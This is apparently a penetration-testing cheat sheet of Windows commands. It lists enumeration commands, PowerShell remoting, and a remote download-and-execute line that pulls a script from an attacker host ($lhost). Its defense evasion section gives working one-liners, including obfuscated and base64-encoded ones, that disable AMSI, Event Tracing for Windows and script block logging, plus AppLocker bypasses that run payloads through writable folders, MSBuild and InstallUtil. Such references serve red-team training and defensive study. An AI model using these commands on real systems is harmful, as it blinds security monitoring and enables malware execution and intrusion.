# Windows Command

## Table of Contents

- [User Enumeration](#user-enumeration)
- [System Information](#system-information)
- [Network Enumeration](#network-enumeration)
- [Process and Service Enumeration](#process-and-service-enumeration)
- [Share Enumeration](#share-enumeration)
- [Remote Command Execution](#remote-command-execution)
- [PowerShell Remoting Cmdlets](#powershell-remoting-cmdlets)
- [Defense Evasion](#defense-evasion)
  - [AMSI Bypass](#amsi-bypass)
  - [ETW Bypass](#etw-bypass)
  - [Script Block Logging Bypass](#script-block-logging-bypass)
  - [AppLocker Bypass](#applocker-bypass)

---

## User Enumeration

- List local users

    ```shell
    Get-LocalUser
    ```

- List domain users

    ```powershell
    Get-ADUser -Filter *
    ```

- Get current user

    ```shell
    whoami
    $env:USERNAME
    ```

- Get user groups

    ```shell
    whoami /groups
    Get-LocalGroup
    Get-ADGroupMember "Domain Admins"
    ```

---

## System Information

```shell
systeminfo
Get-ComputerInfo
```

- OS version

    ```shell
    [System.Environment]::OSVersion
    Get-WmiObject Win32_OperatingSystem
    ```

- Architecture

    ```shell
    [System.Environment]::Is64BitOperatingSystem
    $env:PROCESSOR_ARCHITECTURE
    ```

- Hostname

    ```shell
    hostname
    $env:COMPUTERNAME
    ```

- Domain information

    ```shell
    Get-WmiObject Win32_ComputerSystem | Select Domain
    ```

---

## Network Enumeration

- Network interfaces

    ```shell
    ipconfig /all
    Get-NetIPAddress
    Get-NetIPConfiguration
    ```

- Routing table

    ```shell
    route print
    Get-NetRoute
    ```

- ARP table

    ```shell
    arp -a
    Get-NetNeighbor
    ```

- Active connections

    ```shell
    netstat -ano
    Get-NetTCPConnection
    ```

- DNS cache

    ```shell
    ipconfig /displaydns
    Get-DnsClientCache
    ```

---

## Process and Service Enumeration

- List running processes

    ```shell
    Get-Process
    tasklist /v
    ```

- Enumerate Windows services

    ```shell
    Get-Service
    sc query
    ```

- List scheduled tasks

    ```shell
    Get-ScheduledTask
    schtasks /query /fo LIST /v
    ```

- List startup programs

    ```shell
    Get-CimInstance Win32_StartupCommand
    wmic startup get caption,command
    ```

---

## Share Enumeration

- List shares

    ```shell
    net share
    Get-SmbShare
    Get-WmiObject Win32_Share
    ```

- Access shares

    ```shell
    net use \\target\share
    Get-SmbMapping
    ```

- Find accessible shares on network

    ```shell
    Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
    ```

---

## Remote Command Execution

- Basic command execution

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami }
    ```

- Multiple commands

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock { whoami hostname ipconfig }
    ```

- Execute local script on remote

    ```shell
    Invoke-Command -ComputerName $rhost -FilePath .\script.ps1
    ```

- Download and execute

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("http://$lhost/script.ps1")}
    ```

---

## PowerShell Remoting Cmdlets

- Interactive Remote Session

    ```shell
    Enter-PSSession -ComputerName $rhost
    ```

- Exit Remote Session

    ```shell
    Exit-PSSession
    ```

- Run Command Remotely

    ```shell
    Invoke-Command -ComputerName $rhost -ScriptBlock {cmd}
    ```

- Create persistent session

    ```shell
    $s = New-PSSession -ComputerName $rhost
    ```

- Close session

    ```shell
    Remove-PSSession -Session $s
    ```

- List active sessions

    ```shell
    Get-PSSession
    ```

---

## Defense Evasion

### AMSI Bypass

> Bypass Antimalware Scan Interface to run malicious PowerShell

#### Memory Patching (One-liner)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### Obfuscated Version

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

#### Matt Graeber's Method

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### Base64 Encoded One-liner

```powershell
powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbGBsACwAJAB0AHIAdQBlACkA
```

#### Using Invisi-Shell

```powershell
# Run PowerShell without logging or AMSI
.\RunWithPathAsAdmin.bat
.\RunWithRegistryNonAdmin.bat
```

---

### ETW Bypass

> Disable Event Tracing for Windows

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

---

### Script Block Logging Bypass

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

---

### AppLocker Bypass

#### Common Bypass Directories

```powershell
# Default writable locations
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks
C:\Windows\SysWOW64\com\dmp
```

#### Execute from Bypass Locations

```cmd
copy payload.exe C:\Windows\Tasks\
C:\Windows\Tasks\payload.exe
```

#### MSBuild Bypass

```cmd
# Create .csproj file with embedded payload
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
```

#### InstallUtil Bypass

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

---

## See Also

- **[Linux Command](6.2.Linux-command.md)** - Linux system commands
- **[Reverse Shell](6.3.Reverse-Shell.md)** - Shell payloads for Windows and Linux
- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Windows privesc techniques
- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - Active Directory attacks
